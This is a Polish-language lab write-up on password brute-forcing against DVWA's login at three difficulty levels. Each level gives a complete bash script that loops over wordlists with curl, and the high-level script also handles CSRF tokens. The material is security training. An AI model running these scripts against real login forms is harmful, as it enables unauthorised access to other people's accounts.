# Brute Force: Password Guessing
## Opis techniki
<blockquote>Brute force to technika stosowana w celu odgadnięcia hasła np. do formularza logowania aplikacji internetowej. Jest to proces, w którym próbujemy wielokrotnie wprowadzić różne kombinacje nazw użytkowników i haseł, aż znajdziemy poprawną ich kombinację.

Istnieje wiele narzędzi, które automatyzują ten proces, umożliwiając testowanie tysięcy, a nawet milionów kombinacji w krótkim czasie. Główną ideą w brute force jest wykorzystanie potencjalnych słabości w zabezpieczeniach aplikacji, które pozwalają na wielokrotne próby logowania bez ograniczeń.

Jednym z przypadków wykorzystania jest brute force formularza logowania na stronie internetowej. Przestępcy mogą skorzystać z automatycznych skryptów lub dedykowanych narzędzi do wysyłania zapytań HTTP zawierających różne kombinacje nazw użytkowników i haseł. Te narzędzia automatycznie sprawdzają poprawność danych logowania, sprawdzając odpowiedź serwera na podstawie kodu statusu HTTP, lub znanej treści w ciele HTTP.

W przypadku ataku brute force na formularz logowania, istotne jest ustalenie odpowiednich parametrów, takich jak liczba prób, opóźnienia między próbami i inne limity, które pomagają uniknąć wykrycia przez zabezpieczenia aplikacji. Przestępcy mogą wykorzystać listy popularnych haseł, słowniki i inne techniki, aby zwiększyć szanse na odgadnięcie hasła.</blockquote>

## DVWA labs

- [DVWA Brute Force #1 - Low](#dvwa-brute-force-1---low)

- [DVWA Brute Force #2 - Medium](#dvwa-brute-force-2---medium)

- [DVWA Brute Force #3 - High](#dvwa-brute-force-3---high)


<br/>

## DVWA Brute Force #1 - Low
Na niskim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Dane logowania są przesyłane w parametrach GET
* Odpowiedzi będą przychodziły bez dodanego sztucznie opóźnienia

![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-08_235851616.png "Odpowiedzi przychodzące dla kolejnych prób bez dodanego sztucznie opóźnienia")

#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | plik z nazwami użytkownika | plik | /usr/share/seclists/Usernames/top-usernames-shortlist.txt|
| 3 | plik z hasłami | plik | /usr/share/wordlists/rockyou.txt|

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <username_file> <password_file>"
  echo "Description: This script attempts to find a valid combination of username and password by brute-forcing a login form."
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <username_file> Path to a file containing a list of usernames to try"
  echo "  <password_file> Path to a file containing a list of passwords to try"
}

# Check if the required number of arguments are provided
if [[ $# -ne 3 ]]; then
  display_usage
  exit 1
fi

get_cookie() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=low&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/low/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

find_valid_combo() {
  while IFS= read -r password; do
    while IFS= read -r username; do
      echo -ne "\r\033[0KTrying $username:$password"
      result=$(curl -is -x "http://127.0.0.1:8080" -b dvwa.cookie "$1/vulnerabilities/brute/?username=${username}&password=${password}&Login=Login" | grep -i "password protected area")
      [[ -n "$result" ]] && echo -ne "\r\033[0KValid combo found! It's $username:$password" && exit
    done < "$2"
  done < "$3"
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 || -z $3 ]]; then
  display_usage
  exit 1
fi

# Get cookie
get_cookie "$1"

# Find valid combination of username and password
find_valid_combo "$1" "$2" "$3"

echo "No valid combo found!"
```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/brute_low.gif "Po uruchomieniu skrypt próbuje każdej kombinacji, dopóki nie znajdzie działającej")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```


<br/>

<br/>
<br/>

## DVWA Brute Force #2 - Medium
Na średnim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Dane logowania są przesyłane w parametrach GET
* Odpowiedzi będą przychodziły z dodanym 2s opóźnieniem

![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-08_232748835.png "Odpowiedzi przychodzące z 2s opóźnieniem dla kolejnych prób")

#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | plik z nazwami użytkownika | plik | /usr/share/seclists/Usernames/top-usernames-shortlist.txt|
| 3 | plik z hasłami | plik | /usr/share/wordlists/rockyou.txt|

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <username_file> <password_file>"
  echo "Description: This script attempts to find a valid combination of username and password by brute-forcing a login form."
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <username_file> Path to a file containing a list of usernames to try"
  echo "  <password_file> Path to a file containing a list of passwords to try"
}

# Check if the required number of arguments are provided
if [[ $# -ne 3 ]]; then
  display_usage
  exit 1
fi

get_cookie() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=medium&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/medium/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

find_valid_combo() {
  while IFS= read -r password; do
    while IFS= read -r username; do
      echo -ne "\r\033[0KTrying $username:$password"
      result=$(curl -is -x "http://127.0.0.1:8080" -b dvwa.cookie "$1/vulnerabilities/brute/?username=${username}&password=${password}&Login=Login" | grep -i "password protected area")
      [[ -n "$result" ]] && echo -ne "\r\033[0KValid combo found! It's $username:$password" && exit
    done < "$2"
  done < "$3"
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 || -z $3 ]]; then
  display_usage
  exit 1
fi

# Get cookie
get_cookie "$1"

# Find valid combination of username and password
find_valid_combo "$1" "$2" "$3"

echo "No valid combo found!"
```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/brute_medium.gif "Po uruchomieniu skrypt próbuje każdej kombinacji, dopóki nie znajdzie działającej")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```


<br/>

<br/>
<br/>

## DVWA Brute Force #3 - High
Na wysokim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Dane logowania są przesyłane w parametrach GET
* Odpowiedzi będą przychodziły z dodanym losowym opóźnieniem od 0s do nawet 3s
* Każde żądanie musi zawierać ważny token CSRF

![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-08_163132391.png "Odpowiedzi przychodzące z losowym opóźnieniem dla kolejnych prób")

#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | plik z nazwami użytkownika | plik | /usr/share/seclists/Usernames/top-usernames-shortlist.txt|
| 3 | plik z hasłami | plik | /usr/share/wordlists/rockyou.txt|

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <username_file> <password_file>"
  echo "Description: This script attempts to find a valid combination of username and password by brute-forcing a login form."
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <username_file> Path to a file containing a list of usernames to try"
  echo "  <password_file> Path to a file containing a list of passwords to try"
}

# Check if the required number of arguments are provided
if [[ $# -ne 3 ]]; then
  display_usage
  exit 1
fi

get_csrf() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=high&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/high/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

find_valid_combo() {
  local csrf=$1
  while IFS= read -r password; do
    while IFS= read -r username; do
      echo -ne "\r\033[0KTrying $username:$password"
      result=$(curl -is -x "http://127.0.0.1:8080" -b dvwa.cookie "$2/vulnerabilities/brute/?username=${username}&password=${password}&Login=Login&user_token=${csrf}")
      csrf=$(echo "$result" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
      result=$(echo "$result" | grep -i "password protected area")
      [[ -n "$result" ]] && echo -ne "\r\033[0KValid combo found! It's $username:$password" && exit
    done < "$3"
  done < "$4"
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 || -z $3 ]]; then
  display_usage
  exit 1
fi

# Get CSRF token
get_csrf "$1"

# Find valid combination of username and password
find_valid_combo "$csrf" "$1" "$2" "$3"

echo "No valid combo found!"
```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/brute_high.gif "Po uruchomieniu skrypt próbuje każdej kombinacji, dopóki nie znajdzie działającej")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```


<br/>
